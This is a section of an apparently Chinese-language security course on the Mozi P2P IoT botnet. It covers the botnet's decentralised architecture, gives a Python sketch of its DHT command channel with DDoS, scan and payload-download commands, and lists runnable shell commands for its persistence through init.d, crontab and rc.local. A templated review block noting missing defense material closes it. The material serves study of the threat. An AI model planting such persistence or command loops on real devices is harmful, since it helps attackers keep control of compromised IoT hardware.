# Mozi P2P僵尸网络

### 7.1 Mozi概述

Mozi于2019年被发现，是首个基于P2P架构的大型IoT僵尸网络，感染了数以万计的IoT设备。其核心创新在于完全去中心化的控制架构。

### 7.2 Mozi架构

```
传统中心化僵尸网络:
           ┌─────┐
           │ C2  │
           └──┬──┘
    ┌───┬───┼───┬───┐
    │   │   │   │   │  ← 所有Bot连接C2
   Bot Bot Bot Bot Bot

Mozi P2P僵尸网络:
    ┌───┐       ┌───┐
    │Bot│←----→│Bot│
    └─┬─┘       └─┬─┘
      │     ┌───┘  │
    ┌─┴─┐   ┌┴──┐ ┌┴──┐
    │Bot│←→│Bot│←│Bot│  ← 每个Bot既是客户端也是服务器
    └───┘   └───┘ └───┘
```

### 7.3 Mozi的P2P通信机制

```python
# Mozi P2P通信机制分析
class MoziP2P:
    """Mozi P2P通信核心"""
    
    # Mozi使用自定义的P2P协议
    # 基于Kademlia DHT算法
    
    def __init__(self):
        self.node_id = self.generate_node_id()
        self.peer_list = {}
        self.routing_table = KBucket(self.node_id)
        
    def generate_node_id(self) -> bytes:
        """生成节点ID (160位)"""
        # 基于设备特征生成唯一ID
        mac = get_mac_address()
        arch = get_architecture()
        seed = mac + arch + os.urandom(16)
        return hashlib.sha1(seed).digest()
    
    def join_network(self, bootstrap_nodes: list):
        """加入P2P网络"""
        for node in bootstrap_nodes:
            self.send_ping(node)
            if self.recv_pong(node):
                self.routing_table.add(node)
        
        # 通过DHT FIND_NODE发现更多节点
        self.discover_peers()
    
    def receive_command(self):
        """接收命令（去中心化方式）"""
        # 命令通过P2P网络传播
        # 使用ECC签名验证命令来源
        message = self.recv_from_peers()
        
        if self.verify_signature(message):
            cmd = self.decrypt_command(message)
            self.execute_command(cmd)
    
    def execute_command(self, cmd: dict):
        """执行P2P命令"""
        if cmd['type'] == 'ddos':
            self.launch_attack(cmd['target'], cmd['method'])
        elif cmd['type'] == 'scan':
            self.start_scanning()
        elif cmd['type'] == 'download':
            self.download_payload(cmd['url'])
    
    # Mozi加密体系:
    # - ECC (secp256k1) 用于命令签名
    # - AES-128-CBC 用于数据加密
    # - SHA-256 用于完整性校验
```

### 7.4 Mozi持久化机制

```bash
# Mozi的持久化手段

# 1. init.d持久化（最常见）
cat > /etc/init.d/lighttpd << 'EOF'
#!/bin/sh
# Mozi persistence
cd /tmp; ./mozi
EOF
chmod +x /etc/init.d/lighttpd

# 2. crontab持久化
(crontab -l 2>/dev/null; echo "0 */12 * * * cd /tmp; ./mozi") | crontab -

# 3. rc.local持久化
echo "cd /tmp; ./mozi" >> /etc/rc.local

# 4. 修改启动脚本
# 部分变体会修改/sbin/init或/usr/sbin/init

# 5. 跨平台感染
# Mozi支持: ARM, MIPS, x86, x86_64
# 能感染: 路由器, 摄像头, DVR, NVR, 智能家居
```

---

---

## 📋 内容审核与补充建议

> 针对「Mozi P2P僵尸网络」部分的内容审核结果：

### 🔧 工具推荐
- ⚠️ 缺少tools相关内容

### 🎯 实战练习
- ⚠️ 缺少practice相关内容

### 🛡️ 防御方案
- ⚠️ 缺少defense相关内容

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
